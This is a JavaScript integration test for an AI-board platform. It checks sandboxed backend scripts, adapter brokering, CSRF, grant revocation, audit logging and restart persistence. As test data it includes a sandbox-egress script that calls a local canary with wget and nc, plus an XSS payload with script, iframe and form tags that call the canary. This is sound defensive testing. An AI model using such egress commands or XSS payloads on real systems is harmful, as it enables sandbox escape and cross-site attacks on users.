// Full-chain online-egress integration runner (explicit, not part of `node --test`).
// Real serving process (server/index.js) + real session cookie/CSRF + disposable PostgreSQL + REAL sandbox runner
// started with the zero-egress policy (network: none, real microsandbox SDK microVM) + localhost HTTP fixtures.
// Env: DATABASE_URL, T24_RUNNER_URL, T24_RUNNER_TOKEN_FILE, T24_HOST_IP (host as seen from the guest, used only to try to reach the canary).
// With T24_KEEP=1 the server stays up after the matrix and a state file is written for the browser phase.
import assert from 'node:assert/strict';
import http from 'node:http';
import dgram from 'node:dgram';
import { spawn } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { writeFileSync } from 'node:fs';
import { db } from '../server/db.js';

const d = db.d;
const PORT = 18041, TARGET = 18101, CANARY = 18102;
const HOST_IP = process.env.T24_HOST_IP || '192.168.65.254';
const CRED = 'Bearer FIXTURE-ONLINE-CRED';
const root = `http://127.0.0.1:${PORT}`;
const checks = [];
const mark = (n) => checks.push(n);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const now = Date.now();

// ---- fixtures ----
const target = [], canary = { http: [], udp: [] };
const targetServer = http.createServer((req, res) => {
  let body = ''; req.on('data', (c) => { body += c; }).on('end', () => {
    target.push({ url: req.url, auth: req.headers.authorization, body: JSON.parse(body || '{}') });
    const reply = () => res.end(JSON.stringify({ status: 'queued', ref: 'r-1', internal_debug: 'MUST-NOT-LEAK' }));
    if (req.url === '/slow') setTimeout(reply, 1500); else reply();
  });
}).listen(TARGET, '127.0.0.1');
const canaryHttp = http.createServer((req, res) => {
  if (req.url === '/__count') { res.setHeader('access-control-allow-origin', '*'); res.end(JSON.stringify({ http: canary.http.length, udp: canary.udp.length, urls: canary.http })); return; }
  canary.http.push(req.url); res.end('canary');
}).listen(CANARY, '0.0.0.0');
const canaryUdp = dgram.createSocket('udp4'); canaryUdp.on('message', (m, r) => canary.udp.push(r.address)); canaryUdp.bind(CANARY, '0.0.0.0');

// ---- serving process ----
let server;
async function start() {
  server = spawn(process.execPath, ['server/index.js'], { stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, PORT: String(PORT), HOST: '127.0.0.1',
    CSRF_ENFORCE: '1', AI_BOARD_ONLINE_BACKEND_SCRIPTS: 'true', T24_CRED: CRED, ONLINE_RUNNER_URL: process.env.T24_RUNNER_URL, ONLINE_RUNNER_TOKEN_FILE: process.env.T24_RUNNER_TOKEN_FILE,
    AI_BOARD_ONLINE_ADAPTERS: JSON.stringify({ ok: { url: `http://127.0.0.1:${TARGET}/send`, credential_var: 'T24_CRED' }, slow: { url: `http://127.0.0.1:${TARGET}/slow`, credential_var: 'T24_CRED' } }) } });
  let log = ''; server.stdout.on('data', (c) => { log += c; }); server.stderr.on('data', (c) => { log += c; });
  for (let i = 0; i < 120; i += 1) { try { await fetch(`${root}/api/health`); return; } catch { /* booting */ } await sleep(500); }
  throw new Error(`server did not start\n${log.slice(-1500)}`);
}
const stop = async () => { server.kill(); await new Promise((r) => server.once('exit', r)); };

// ---- HTTP helpers using real session cookie + CSRF ----
let csrfCookie, csrfToken;
async function csrf(actor) { const res = await fetch(`${root}/api/csrf`, { headers: { Cookie: `tizia_sid=${actor.token}` } }); assert.equal(res.status, 200, `csrf endpoint status ${res.status}`); csrfToken = (await res.json()).token; csrfCookie = (res.headers.getSetCookie?.() || []).map((c) => c.split(';')[0]).find((c) => c.startsWith('tizia_csrf=')); }
async function call(actor, route, body, expected = 200, { useCsrf = true } = {}) {
  const res = await fetch(root + route, { method: body === undefined ? 'GET' : 'POST', headers: { 'Content-Type': 'application/json',
    Cookie: [actor && `tizia_sid=${actor.token}`, csrfCookie || `tizia_csrf=${csrfToken}`].filter(Boolean).join('; '), ...(useCsrf ? { 'X-CSRF-Token': csrfToken } : {}) },
  body: body === undefined ? undefined : JSON.stringify(body) });
  const json = await res.json().catch(() => ({})); assert.equal(res.status, expected, `${route} ${JSON.stringify(json)}`); return json;
}

const GOOD = String.raw`id=$(printf %s "$1" | sed 's/.*"record_id":\([0-9]*\).*/\1/'); printf '{"intent":{"operation":"send_note","record_id":%s}}\n' "$id"`;
const scripts = {
  good: GOOD,
  egress: `wget -q -T3 -O- http://${HOST_IP}:${CANARY}/vm-http >/dev/null 2>&1; echo x | nc -u -w1 ${HOST_IP} ${CANARY}; ${GOOD}`,
  url: String.raw`printf '{"intent":{"operation":"send_note","record_id":1,"url":"http://x"}}\n'`,
  extra: String.raw`printf '{"intent":{"operation":"send_note","record_id":1},"extra":1}\n'`,
  notjson: 'echo not-json',
  hang: 'sleep 60',
  big: "head -c 200000 /dev/zero | tr '\\0' x",
  delay: `sleep 4; ${GOOD}`,
};

try {
  await start();
  const suffix = randomBytes(5).toString('hex');
  const actors = {};
  for (const [name, role] of [['admin', 'admin'], ['creator', 'student'], ['other', 'student']]) {
    const id = await d.insert('INSERT INTO users(username,display_name,password_hash,role,created_at,enrolled_domain,major) VALUES(?,?,?,?,?,?,?)',
      [`t24c_${name}_${suffix}`, name, 'synthetic-unusable-hash', role, now, 'it', 'it']);
    const token = randomBytes(32).toString('hex');
    await d.run('INSERT INTO sessions(token,user_id,created_at,expires_at) VALUES(?,?,?,?)', [token, id, now, now + 3600000]);
    actors[name] = { id, token };
  }
  await csrf(actors.admin);
  const mk = async (tag) => {
    const slug = `t24c-${tag}-${randomBytes(4).toString('hex')}`;
    const f = await d.insert(`INSERT INTO ai_feature_folders(slug,title,owner_user_id,domain,state,approved_at,created_at,updated_at,last_activity_at)
      VALUES(?,?,?,?,?,?,?,?,?)`, [slug, 'Synthetic online feature', actors.creator.id, 'it', 'active', now, now, now, now]);
    await d.run(`INSERT INTO ai_feature_releases (slug, folder_id, owner_user_id, status, updated_by, updated_at) VALUES (?, ?, ?, 'school', ?, ?)`,
      [slug, f, actors.creator.id, actors.admin.id, now]);
    const r = (await call(actors.admin, `/api/ai-board/features/${f}/resources`, { name: 'notes', fields: ['text', 'private_note'] })).id;
    const rec = (await call(actors.creator, `/api/ai-board/features/${f}/resources/${r}/records`, { data: { text: 'hello online', private_note: 'must not leave' } })).id;
    return { f, r, rec, slug };
  };
  const A = await mk('a'), B = await mk('b');
  const ops = (r) => [{ operation: 'send_note', adapter: 'ok', resource_id: r, fields: ['text'], response_fields: ['status', 'ref'] },
    { operation: 'send_slow', adapter: 'slow', resource_id: r, fields: ['text'], response_fields: ['status'] }];
  const ui = (r) => ({ version: 1, title: 'Ghi chú', blocks: [{ type: 'record_list', title: 'Danh sách', resource_id: r, fields: [{ name: 'text', label: 'Nội dung' }],
    row_actions: [{ label: 'Gửi', operation: 'send_note' }] }] });
  const register = (F, script, expected = 200, extra = {}) => call(actors.admin, `/api/admin/ai-board/features/${F.f}/online`,
    { operations: ops(F.r), ui: ui(F.r), backend_script: script, ...extra }, expected);
  const backend = (actor, F, expected = 200) => call(actor, `/api/ai-board/features/${F.f}/online/backend`, { record_id: F.rec }, expected);

  // default deny and registration validation
  assert.equal((await call(actors.creator, `/api/ai-board/features/${B.f}/online/invoke`, { operation: 'send_note', record_id: B.rec }, 404)).error, 'operation_not_approved');
  assert.equal((await backend(actors.creator, B, 404)).error, 'backend_not_found');
  await call(actors.creator, `/api/ai-board/features/${B.f}/online/ui`, undefined, 404); mark('Nothing registered: operations, backend and UI all denied by default');
  await call(actors.creator, `/api/admin/ai-board/features/${A.f}/online`, { operations: ops(A.r) }, 403);
  await call(actors.admin, `/api/admin/ai-board/features/${A.f}/online`, { operations: ops(A.r) }, 403, { useCsrf: false });
  for (const [patch, status] of [[{ operations: [{ ...ops(A.r)[0], adapter: 'nope' }] }, 400], [{ operations: [{ ...ops(A.r)[0], resource_id: B.r }] }, 400],
    [{ operations: [{ ...ops(A.r)[0], fields: ['text', 'secret_col'] }] }, 400], [{ operations: [{ ...ops(A.r)[0], url: 'http://x' }] }, 400],
    [{ ui: { ...ui(A.r), blocks: [{ type: 'text', text: '<script>1</script>' }] } }, 422], [{ backend_script: 'x'.repeat(100001) }, 400]]) {
    await register(A, scripts.good, status, patch);
  }
  mark('Registration is admin-only + strict CSRF; unknown adapter/resource/field, extra keys, hostile UI, oversized script rejected');
  await register(A, scripts.good);
  assert.equal((await call(actors.creator, `/api/ai-board/features/${A.f}/online/ui`)).blocks[0].type, 'record_list'); mark('Registered UI served from DB');

  // full chain, real SDK microVM
  const t0 = Date.now();
  const ok = await backend(actors.creator, A);
  const chainMs = Date.now() - t0;
  assert.deepEqual(ok, { result: { status: 'queued', ref: 'r-1' } });
  assert.equal(target.length, 1); assert.equal(target[0].auth, CRED); assert.deepEqual(target[0].body, { text: 'hello online' });
  assert.ok(!JSON.stringify(ok).includes('MUST-NOT-LEAK')); mark(`Full chain: request -> online microVM backend -> intent -> broker -> adapter -> result (${chainMs} ms cold VM)`);
  await backend(actors.other, A, 403); await backend(null, A, 401); assert.equal(target.length, 1);
  mark('Chain denies wrong owner (403) and unauthenticated (401) without reaching the adapter');

  await register(A, scripts.egress); await backend(actors.creator, A);
  assert.equal(canary.http.length + canary.udp.length, 0); assert.equal(target.length, 2); mark('Backend that tries wget/nc to the host canary: result still returns, 0 HTTP and 0 UDP canary arrivals');

  const before = target.length;
  for (const [name, code, status] of [['url', 'invalid_input', 400], ['extra', 'backend_bad_output', 502], ['notjson', 'backend_bad_output', 502], ['big', 'backend_failed', 502], ['hang', 'backend_failed', 502]]) {
    await register(A, scripts[name]);
    assert.equal((await backend(actors.creator, A, status)).error, code, name);
  }
  assert.equal(target.length, before); mark('Hostile intents (url key, extra key, non-JSON, oversized stdout, hang past deadline) all fail closed before the adapter');

  // delayed operation: revoke while the VM runs, then while the external call is pending
  await register(A, scripts.delay);
  await call(actors.admin, `/api/ai-board/features/${A.f}/resources/${A.r}/grants`, { user_id: actors.other.id, owner_user_id: actors.creator.id, permission: 'read' });
  await register(A, scripts.good);
  await backend(actors.other, A, 200); const n1 = target.length;
  await register(A, scripts.delay);
  const pending = backend(actors.other, A, 403);
  await sleep(1500);
  await call(actors.admin, `/api/ai-board/features/${A.f}/resources/${A.r}/grants`, { user_id: actors.other.id, owner_user_id: actors.creator.id, permission: 'none' });
  assert.equal((await pending).error, 'scope_denied'); assert.equal(target.length, n1);
  mark('Grant revoked while the backend VM runs: invoke denied after VM finished, adapter not called');
  await call(actors.admin, `/api/ai-board/features/${A.f}/resources/${A.r}/grants`, { user_id: actors.other.id, owner_user_id: actors.creator.id, permission: 'read' });
  const slow = call(actors.other, `/api/ai-board/features/${A.f}/online/invoke`, { operation: 'send_slow', record_id: A.rec }, 403);
  await sleep(600);
  await call(actors.admin, `/api/ai-board/features/${A.f}/resources/${A.r}/grants`, { user_id: actors.other.id, owner_user_id: actors.creator.id, permission: 'none' });
  const slowRes = await slow;
  assert.equal(slowRes.error, 'scope_denied'); assert.equal(target.at(-1).url, '/slow');
  mark('Grant revoked while the external call is pending: result withheld (the already-sent external call is not recallable; documented)');

  // persisted audit
  const rows = await d.all('SELECT * FROM ai_online_audit WHERE feature_id IN (?, ?)', [A.f, B.f]);
  const outcomes = rows.map((r) => r.outcome);
  for (const o of ['ok', 'scope_denied', 'operation_not_approved', 'backend_failed', 'backend_bad_output', 'invalid_input', 'backend_not_found']) assert.ok(outcomes.includes(o), `audit lacks ${o}`);
  assert.deepEqual(Object.keys(rows[0]).sort(), ['actor_user_id', 'adapter', 'created_at', 'feature_id', 'id', 'operation', 'outcome']);
  assert.ok(!JSON.stringify(rows).includes('hello online') && !JSON.stringify(rows).includes('FIXTURE') && !JSON.stringify(rows).includes(actors.creator.token));
  mark(`Audit persisted in ai_online_audit: ${rows.length} rows, actor/operation/outcome only`);
  const auditBefore = rows.length;

  // serving restart: registrations, grants and audit survive; authorization re-read
  await register(A, scripts.good);
  await call(actors.admin, `/api/ai-board/features/${A.f}/resources/${A.r}/grants`, { user_id: actors.other.id, owner_user_id: actors.creator.id, permission: 'none' });
  await stop(); await start(); await csrf(actors.admin);
  const n2 = target.length;
  await backend(actors.creator, A); assert.equal(target.length, n2 + 1);
  await backend(actors.other, A, 403); assert.equal(target.length, n2 + 1);
  mark('After serving restart: registered backend/operations persisted, creator authorized, revoked user denied');
  await d.run("UPDATE ai_feature_releases SET status='off' WHERE slug=?", [A.slug]);
  assert.equal((await backend(actors.creator, A, 404)).error, 'feature_unavailable');
  await d.run("UPDATE ai_feature_releases SET status='school' WHERE slug=?", [A.slug]);
  await d.run('DELETE FROM sessions WHERE token=?', [actors.creator.token]);
  await backend(actors.creator, A, 401); assert.equal(target.length, n2 + 1);
  mark('After restart: release off and revoked session denied before VM/adapter');
  const auditAfter = Number((await d.get('SELECT COUNT(*) AS n FROM ai_online_audit WHERE feature_id IN (?, ?)', [A.f, B.f])).n);
  assert.ok(auditAfter > auditBefore); mark(`Audit survived restart and grew ${auditBefore} -> ${auditAfter}`);
  assert.equal(canary.http.length + canary.udp.length, 0); mark('Final canary: HTTP 0, UDP 0');

  // state for browser phase (fresh session for creator)
  if (process.env.T24_KEEP === '1') {
    const token = randomBytes(32).toString('hex');
    await d.run('INSERT INTO sessions(token,user_id,created_at,expires_at) VALUES(?,?,?,?)', [token, actors.creator.id, Date.now(), Date.now() + 3600000]);
    const C = `http://127.0.0.1:${CANARY}`;
    const hostile = `<img src=${C}/img><iframe src=${C}/frame></iframe><form action=${C}/form method=post><button>x</button></form><a href=${C}/link>link</a><script>fetch('${C}/js')</script> ${C}/text javascript:alert(1)`;
    await register(A, scripts.good, 200, { ui: { version: 1, title: 'Ghi chú', blocks: [{ type: 'heading', text: 'Ghi chú của bạn' }, ...ui(A.r).blocks,
      { type: 'form', title: 'Thêm ghi chú', resource_id: A.r, fields: [{ name: 'text', label: 'Nội dung', kind: 'text' }], submit_label: 'Lưu' }] } });
    const hostileRec = (await call({ token }, `/api/ai-board/features/${A.f}/resources/${A.r}/records`, { data: { text: hostile, private_note: 'x' } })).id;
    writeFileSync(process.env.T24_STATE, JSON.stringify({ port: PORT, feature: A.f, resource: A.r, record: A.rec, hostileRec, token, canary: CANARY }));
    console.log(JSON.stringify({ passed: checks.length, checks, canaryHttp: canary.http.length, canaryUdp: canary.udp.length, realSdkMicroVm: true, realPostgres: true, modelCalls: 0 }, null, 2));
    console.log('KEEP: server up, state written'); await new Promise(() => {});
  }
  console.log(JSON.stringify({ passed: checks.length, checks, canaryHttp: canary.http.length, canaryUdp: canary.udp.length, realSdkMicroVm: true, realPostgres: true, modelCalls: 0 }, null, 2));
} finally {
  if (process.env.T24_KEEP !== '1') { try { await stop(); } catch { /* not started */ } targetServer.close(); canaryHttp.close(); canaryUdp.close(); await db.close(); }
}
